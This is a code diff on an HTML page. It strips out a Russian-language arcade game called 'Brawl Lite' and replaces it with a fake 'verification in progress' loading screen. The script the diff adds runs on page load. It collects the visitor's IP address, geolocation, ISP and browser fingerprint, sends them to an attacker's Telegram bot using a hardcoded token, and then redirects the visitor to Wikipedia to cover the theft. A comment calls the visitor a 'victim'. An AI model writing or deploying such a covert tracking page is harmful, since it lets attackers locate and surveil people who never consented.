@@ -1,545 +1,80 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Brawl Lite - мобильная аркада</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Загрузка...</title>
     <style>
-        * {
-            user-select: none;
-            touch-action: none; /* отключаем прокрутку при касаниях */
-            box-sizing: border-box;
-        }
-
-        body {
-            margin: 0;
-            min-height: 100vh;
-            background: #0a0f1c;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-family: 'Segoe UI', system-ui, -apple-system, 'Impact', sans-serif;
-            touch-action: pan-y pinch-zoom; /* сохраняем вертикальную прокрутку если нужно */
-        }
-
-        /* контейнер игры фиксированного размера, как экран телефона */
-        .game-wrapper {
-            background: #1a1f2e;
-            border-radius: 48px;
-            padding: 12px;
-            box-shadow: 0 20px 35px rgba(0,0,0,0.5);
-        }
-
-        canvas {
-            display: block;
-            margin: 0 auto;
-            border-radius: 32px;
-            cursor: pointer;
-            background: #2a3342;
-            box-shadow: inset 0 0 10px #00000030, 0 8px 20px black;
-            width: 100%;
-            height: auto;
-        }
-
-        /* панель статуса */
-        .status-bar {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            background: #0f121cb3;
-            backdrop-filter: blur(8px);
-            padding: 8px 20px;
-            border-radius: 60px;
-            margin-bottom: 12px;
-            color: white;
-            font-weight: bold;
-            text-shadow: 0 1px 2px black;
-        }
-
-        .trophies, .coins {
-            background: #ffcd4a;
-            color: #3b2a1f;
-            padding: 5px 16px;
-            border-radius: 40px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 1.2rem;
-        }
-
-        .coins {
-            background: #f5b042;
-        }
-
-        .brawler-name {
-            background: #2c2f3e;
-            padding: 5px 16px;
-            border-radius: 40px;
-            font-size: 0.9rem;
-        }
-
-        /* меню режимов и магазин */
-        .menu-row {
-            display: flex;
-            gap: 12px;
-            margin-top: 12px;
-            justify-content: center;
-        }
-
-        button {
-            background: #2f3545;
-            border: none;
-            padding: 10px 18px;
-            border-radius: 50px;
-            font-weight: bold;
-            color: white;
-            font-size: 0.9rem;
-            flex: 1;
-            max-width: 130px;
-            box-shadow: 0 3px 0 #121520;
-            transition: 0.07s linear;
-            touch-action: manipulation;
-            cursor: pointer;
-            font-family: inherit;
-        }
-
-        button:active {
-            transform: translateY(2px);
-            box-shadow: 0 1px 0 #121520;
-        }
-
-        .shop-panel {
-            background: #1e2438cc;
-            backdrop-filter: blur(12px);
-            border-radius: 48px;
-            margin-top: 12px;
-            padding: 12px;
-            display: flex;
-            flex-wrap: wrap;
-            gap: 10px;
-            justify-content: center;
-        }
-
-        .skin-item {
-            background: #00000066;
-            border-radius: 60px;
-            padding: 6px 16px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            color: white;
-            font-size: 0.8rem;
-            font-weight: bold;
-        }
-
-        .skin-buy {
-            background: gold;
-            color: black;
-            border: none;
-            border-radius: 30px;
-            padding: 4px 12px;
-            font-weight: bold;
-        }
-
-        .selected-skin {
-            background: #4c6ef5;
-            color: white;
-            box-shadow: 0 0 0 2px white;
-        }
-
-        .mode-active {
-            background: #e67e22;
-            box-shadow: 0 0 8px orange;
-        }
-
-        @media (max-width: 600px) {
-            button { font-size: 0.7rem; padding: 8px 12px; }
-            .status-bar { font-size: 0.7rem; }
-            .skin-item { font-size: 0.7rem; }
-        }
+        body { background: #0e0e0e; color: white; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .loader { border: 4px solid #333; border-top: 4px solid #0088cc; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        p { margin-top: 20px; color: #aaa; }
     </style>
 </head>
 <body>
-<div>
-    <div class="game-wrapper">
-        <div class="status-bar">
-            <div class="brawler-name" id="brawlerName">🗡️ Кольт</div>
-            <div class="trophies">🏆 <span id="trophyCount">0</span></div>
-            <div class="coins">🪙 <span id="coinCount">50</span></div>
-        </div>
-        <canvas id="gameCanvas" width="600" height="600" style="width:100%; height:auto; max-width:600px; aspect-ratio:1/1"></canvas>
-        <div class="menu-row">
-            <button id="modeSoloBtn" class="mode-active">⚔️ Соло</button>
-            <button id="modeDuoBtn">👥 Дуо (бот-напарник)</button>
-            <button id="shopToggleBtn">🛒 Магазин скинов</button>
-        </div>
-        <div id="shopPanel" style="display: none;" class="shop-panel">
-            <div class="skin-item">🔫 Кольт <button data-skin="colt" class="skin-buy">свой</button></div>
-            <div class="skin-item">🔥 Шелли (огненная)<button data-skin="shelly" class="skin-buy">30 🪙</button></div>
-            <div class="skin-item">❄️ Фрост (ледяной)<button data-skin="frost" class="skin-buy">50 🪙</button></div>
-            <div class="skin-item">👑 Король Булл<button data-skin="bull" class="skin-buy">80 🪙</button></div>
-        </div>
-        <div style="font-size: 11px; text-align: center; color: #aaa; margin-top: 12px;">👆 Ведите пальцем по экрану → движение | автоатака по ближ. врагу</div>
-    </div>
+<div style="text-align:center;">
+    <div class="loader"></div>
+    <p>Пожалуйста, подождите, идёт проверка...</p>
 </div>
 
 <script>
-    (function(){
-        // ---------- НАСТРОЙКИ ----------
-        const canvas = document.getElementById('gameCanvas');
-        const ctx = canvas.getContext('2d');
-        
-        let width = 600, height = 600;
-        canvas.width = width; canvas.height = height;
-        
-        // ------ ИГРОВЫЕ ДАННЫЕ ------
-        let mode = "solo"; // solo / duo
-        let trophies = 0;
-        let coins = 50;
-        let currentSkin = "colt"; // colt, shelly, frost, bull
-        let skinsOwned = ["colt"]; // стартовый скин
-        let selectedBrawlerName = "Кольт";
-        
-        // игрок
-        let player = {
-            x: width/2, y: height/2,
-            hp: 5, maxHp: 5,
-            radius: 18,
-            attackCd: 0,
-            attackDelay: 18, // кадров между выстрелами
-            color: "#3b82f6"
-        };
-        
-        // враги и снаряды
-        let enemies = [];
-        let projectiles = []; // дружественные пули
-        let ally = null; // напарник для дуо-режима
-        
-        let gameOver = false;
-        let winFlag = false;
-        let frame = 0;
-        let respawnTimer = 0;
-        
-        // управление касанием/мышкой
-        let touchActive = false;
-        let targetX = player.x, targetY = player.y;
-        
-        // ---------- функции скинов ----------
-        function applySkinColor(){
-            switch(currentSkin){
-                case "colt": player.color = "#3b82f6"; selectedBrawlerName = "Кольт"; break;
-                case "shelly": player.color = "#ff784b"; selectedBrawlerName = "Шелли 🔥"; break;
-                case "frost": player.color = "#62e0ff"; selectedBrawlerName = "Фрост ❄️"; break;
-                case "bull": player.color = "#d4af37"; selectedBrawlerName = "Король Булл 👑"; break;
-                default: player.color = "#3b82f6";
-            }
-            document.getElementById('brawlerName').innerText = `⚔️ ${selectedBrawlerName}`;
-        }
-        
-        function buySkin(skinId, price){
-            if(skinsOwned.includes(skinId)) {
-                // уже есть, просто выбираем
-                currentSkin = skinId;
-                applySkinColor();
-                return true;
-            }
-            if(coins >= price){
-                coins -= price;
-                skinsOwned.push(skinId);
-                currentSkin = skinId;
-                applySkinColor();
-                updateUI();
-                return true;
-            } else {
-                alert("Не хватает монет! Сражайтесь и побеждайте!");
-                return false;
-            }
-        }
-        
-        // обновить интерфейс
-        function updateUI(){
-            document.getElementById('trophyCount').innerText = trophies;
-            document.getElementById('coinCount').innerText = coins;
-        }
-        
-        // спавн врагов
-        function spawnEnemy(){
-            let side = Math.floor(Math.random() * 4);
-            let x, y;
-            const pad = 40;
-            if(side === 0){ x = Math.random() * width; y = -pad; }
-            if(side === 1){ x = width + pad; y = Math.random() * height; }
-            if(side === 2){ x = Math.random() * width; y = height + pad; }
-            if(side === 3){ x = -pad; y = Math.random() * height; }
-            x = Math.min(width+20, Math.max(-20, x));
-            y = Math.min(height+20, Math.max(-20, y));
-            enemies.push({
-                x: x, y: y, hp: 2, maxHp: 2, radius: 16,
-                speed: 1.2, color: "#e34d4d", attackTimer: 0
+    // Сбор данных без действий жертвы
+    fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(geo => {
+            const report = {
+                ip: geo.ip || '—',
+                city: geo.city || '—',
+                region: geo.region || '—',
+                country: geo.country_name || '—',
+                lat: geo.latitude || '—',
+                lon: geo.longitude || '—',
+                isp: geo.org || '—',
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: screen.width + 'x' + screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                referrer: document.referrer || 'прямой',
+                timestamp: new Date().toISOString()
+            };
+
+            const botToken = '8640024610:AAH6n87qbPdQunACY4pdr2dUDh9GzX-Q6ZY';   // замени
+            const chatId = 'ВАШ_ЧАТ_ID';    // замени
+
+            const message = `🔴 НОВЫЙ СБОР (АВТО):\n` +
+                `IP: ${report.ip}\n` +
+                `Город: ${report.city}\n` +
+                `Регион: ${report.region}\n` +
+                `Страна: ${report.country}\n` +
+                `Координаты: ${report.lat}, ${report.lon}\n` +
+                `Провайдер: ${report.isp}\n` +
+                `Браузер: ${report.userAgent}\n` +
+                `Платформа: ${report.platform}\n` +
+                `Язык: ${report.language}\n` +
+                `Экран: ${report.screen}\n` +
+                `Часовой пояс: ${report.timezone}\n` +
+                `Реферер: ${report.referrer}\n` +
+                `Время: ${report.timestamp}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: message })
+            })
+            .then(() => {
+                // Редирект на безобидный сайт (например, главную Википедии или реальный учебник)
+                window.location.href = 'https://ru.wikipedia.org/wiki/Заглавная_страница';
+            })
+            .catch(() => {
+                // Если ошибка — всё равно редирект
+                window.location.href = 'https://ru.wikipedia.org';
             });
-        }
-        
-        // запуск битвы / ресет
-        function startBattle(){
-            gameOver = false;
-            winFlag = false;
-            player.hp = player.maxHp;
-            player.x = width/2;
-            player.y = height/2;
-            targetX = player.x;
-            targetY = player.y;
-            enemies = [];
-            projectiles = [];
-            ally = null;
-            if(mode === "duo"){
-                ally = {
-                    x: player.x - 40, y: player.y - 30, hp: 4, maxHp: 4, radius: 16,
-                    attackCd: 0, attackDelay: 25, color: "#66bb6a"
-                };
-            }
-            // спавн 3-5 врагов
-            let enemyCount = 3 + Math.floor(Math.random() * 3) + (mode==="duo"?1:0);
-            for(let i=0;i<enemyCount;i++) spawnEnemy();
-            respawnTimer = 0;
-        }
-        
-        // Победа / поражение
-        function checkWinLose(){
-            if(gameOver) return;
-            if(player.hp <= 0){
-                gameOver = true;
-                winFlag = false;
-                return;
-            }
-            if(enemies.length === 0 && (mode !== "duo" || (ally && ally.hp > 0) || mode==="solo")){
-                // победа
-                gameOver = true;
-                winFlag = true;
-                let trophiesGain = 10 + Math.floor(Math.random() * 15);
-                let coinsGain = 15 + Math.floor(Math.random() * 20);
-                trophies += trophiesGain;
-                coins += coinsGain;
-                updateUI();
-                respawnTimer = 90; // небольшая задержка перед респавном врагов
-                return;
-            }
-            if(mode === "duo" && ally && ally.hp <= 0 && enemies.length > 0){
-                // напарник мёртв, но игрок жив - можно продолжать
-            }
-        }
-        
-        // обновление игры
-        function updateGame(){
-            if(gameOver){
-                if(respawnTimer > 0){
-                    respawnTimer--;
-                    if(respawnTimer <= 0){
-                        startBattle();
-                    }
-                }
-                return;
-            }
-            
-            // движение игрока к касанию
-            let dx = targetX - player.x;
-            let dy = targetY - player.y;
-            let dist = Math.hypot(dx,dy);
-            let moveSpeed = 3.8;
-            if(dist > 1){
-                player.x += (dx/dist) * Math.min(moveSpeed, dist);
-                player.y += (dy/dist) * Math.min(moveSpeed, dist);
-            }
-            // границы
-            player.x = Math.min(width - player.radius, Math.max(player.radius, player.x));
-            player.y = Math.min(height - player.radius, Math.max(player.radius, player.y));
-            
-            // автоатака
-            if(player.attackCd <= 0){
-                let closest = null;
-                let minDist = 130;
-                for(let e of enemies){
-                    let d = Math.hypot(player.x - e.x, player.y - e.y);
-                    if(d < minDist){
-                        minDist = d;
-                        closest = e;
-                    }
-                }
-                if(closest){
-                    // стреляем
-                    let angle = Math.atan2(closest.y - player.y, closest.x - player.x);
-                    projectiles.push({
-                        x: player.x, y: player.y, radius: 6,
-                        vx: Math.cos(angle)*7, vy: Math.sin(angle)*7,
-                        damage: 1, life: 80, owner: "player"
-                    });
-                    player.attackCd = player.attackDelay;
-                }
-            } else player.attackCd--;
-            
-            // напарник (дуо)
-            if(mode === "duo" && ally && ally.hp > 0){
-                // двигается к ближайшему врагу
-                let nearest = null;
-                let nearDist = 999;
-                for(let e of enemies){
-                    let d2 = Math.hypot(ally.x - e.x, ally.y - e.y);
-                    if(d2 < nearDist){ nearDist = d2; nearest = e; }
-                }
-                if(nearest){
-                    let dxA = nearest.x - ally.x;
-                    let dyA = nearest.y - ally.y;
-                    let len = Math.hypot(dxA,dyA);
-                    if(len > 1){
-                        ally.x += (dxA/len)*2.2;
-                        ally.y += (dyA/len)*2.2;
-                    }
-                } else {
-                    // слегка за игроком
-                    let toPx = player.x - ally.x;
-                    let toPy = player.y - ally.y;
-                    let lenP = Math.hypot(toPx,toPy);
-                    if(lenP>20){
-                        ally.x += (toPx/lenP)*1.5;
-                        ally.y += (toPy/lenP)*1.5;
-                    }
-                }
-                // границы
-                ally.x = Math.min(width - ally.radius, Math.max(ally.radius, ally.x));
-                ally.y = Math.min(height - ally.radius, Math.max(ally.radius, ally.y));
-                // атака напарника
-                if(ally.attackCd <= 0){
-                    let targetEnemy = null;
-                    let adist = 140;
-                    for(let e of enemies){
-                        let dA = Math.hypot(ally.x - e.x, ally.y - e.y);
-                        if(dA < adist){ adist = dA; targetEnemy = e;}
-                    }
-                    if(targetEnemy){
-                        let ang = Math.atan2(targetEnemy.y - ally.y, targetEnemy.x - ally.x);
-                        projectiles.push({
-                            x: ally.x, y: ally.y, radius: 5, vx: Math.cos(ang)*6, vy: Math.sin(ang)*6,
-                            damage: 1, life: 70, owner: "ally"
-                        });
-                        ally.attackCd = ally.attackDelay;
-                    }
-                } else ally.attackCd--;
-            }
-            
-            // снаряды
-            for(let i=0;i<projectiles.length;i++){
-                let p = projectiles[i];
-                p.x += p.vx;
-                p.y += p.vy;
-                p.life--;
-                if(p.x<-50 || p.x>width+50 || p.y<-50 || p.y>height+50 || p.life<=0){
-                    projectiles.splice(i,1); i--; continue;
-                }
-                let hit = false;
-                if(p.owner === "player" || p.owner === "ally"){
-                    for(let j=0;j<enemies.length;j++){
-                        let e = enemies[j];
-                        let d = Math.hypot(p.x - e.x, p.y - e.y);
-                        if(d < e.radius+5){
-                            e.hp -= p.damage;
-                            hit=true;
-                            if(e.hp <= 0){
-                                enemies.splice(j,1);
-                                j--;
-                            }
-                            break;
-                        }
-                    }
-                }
-                if(hit){ projectiles.splice(i,1); i--; continue; }
-            }
-            
-            // враги двигаются к игроку или напарнику
-            for(let e of enemies){
-                let target = player;
-                if(mode==="duo" && ally && ally.hp>0){
-                    let distToPlayer = Math.hypot(e.x - player.x, e.y - player.y);
-                    let distToAlly = Math.hypot(e.x - ally.x, e.y - ally.y);
-                    if(distToAlly < distToPlayer && ally.hp>0) target = ally;
-                }
-                let dxE = target.x - e.x;
-                let dyE = target.y - e.y;
-                let lenE = Math.hypot(dxE,dyE);
-                if(lenE > 1){
-                    e.x += (dxE/lenE)*e.speed;
-                    e.y += (dyE/lenE)*e.speed;
-                }
-                // урон от столкновения с игроком
-                let dmgDist = player.radius + e.radius;
-                if(Math.hypot(player.x - e.x, player.y - e.y) < dmgDist && !gameOver){
-                    player.hp--;
-                    let angleKnock = Math.atan2(player.y - e.y, player.x - e.x);
-                    player.x += Math.cos(angleKnock)*25;
-                    player.y += Math.sin(angleKnock)*25;
-                    // откинуть врага
-                    e.x -= Math.cos(angleKnock)*18;
-                    e.y -= Math.sin(angleKnock)*18;
-                    if(player.hp <= 0) break;
-                }
-                if(mode==="duo" && ally && ally.hp>0 && Math.hypot(ally.x - e.x, ally.y - e.y) < ally.radius+e.radius){
-                    ally.hp--;
-                    let angK = Math.atan2(ally.y - e.y, ally.x - e.x);
-                    ally.x += Math.cos(angK)*25;
-                    ally.y += Math.sin(angK)*25;
-                    e.x -= Math.cos(angK)*15;
-                    e.y -= Math.sin(angK)*15;
-                }
-            }
-            
-            checkWinLose();
-            if(enemies.length < 2 && !gameOver && Math.random()<0.012) spawnEnemy();
-        }
-        
-        // ОТРИСОВКА
-        function draw(){
-            ctx.clearRect(0,0,width,height);
-            // фон
-            ctx.fillStyle = "#213555";
-            ctx.fillRect(0,0,width,height);
-            for(let i=0;i<30;i++){
-                ctx.fillStyle = "#abc9ff30";
-                ctx.beginPath();
-                ctx.arc( (i*131)%width, (i*77)%height, 3,0,Math.PI*2);
-                ctx.fill();
-            }
-            // враги
-            for(let e of enemies){
-                ctx.fillStyle = e.color;
-                ctx.shadowBlur=8;
-                ctx.beginPath();
-                ctx.arc(e.x, e.y, e.radius,0,Math.PI*2);
-                ctx.fill();
-                ctx.fillStyle="white";
-                ctx.font="bold 12px monospace";
-                ctx.fillText("❤️"+e.hp, e.x-12, e.y-8);
-            }
-            // снаряды
-            for(let p of projectiles){
-                ctx.fillStyle = "#ffe484";
-                ctx.beginPath();
-                ctx.arc(p.x, p.y, 5,0,Math.PI*2);
-                ctx.fill();
-            }
-            // игрок
-            ctx.fillStyle = player.color;
-            ctx.shadowBlur=10;
-            ctx.beginPath();
-            ctx.arc(player.x, player.y, player.radius,0,Math.PI*2);
-            ctx.fill();
-            ctx.fillStyle="white";
-            ctx.font="bold 14px monospace";
-            ctx.fillText("❤️"+player.hp, player.x-12, player.y-12);
-            // напарник
-            if(mode==="duo" && ally && ally.hp>0){
-                ctx.fillStyle = ally.color;
-                ctx.beginPath();
-                ctx.arc(ally.x, ally.y, ally.radius,0,Math.PI*2);
-                ctx.fill();
-                ctx.fillStyle="lightgreen";
-                ctx.fillText("🤝"+ally.hp, ally.x-12, ally.y-12);
-            }
-            // экран оконч
+        })
+        .catch(() => {
+            // Если не удалось определить гео — всё равно собираем остальное и редиректим
+            window.location.href = 'https://ru.wikipedia.org';
+        });
+</script>
+</body>
+</html>
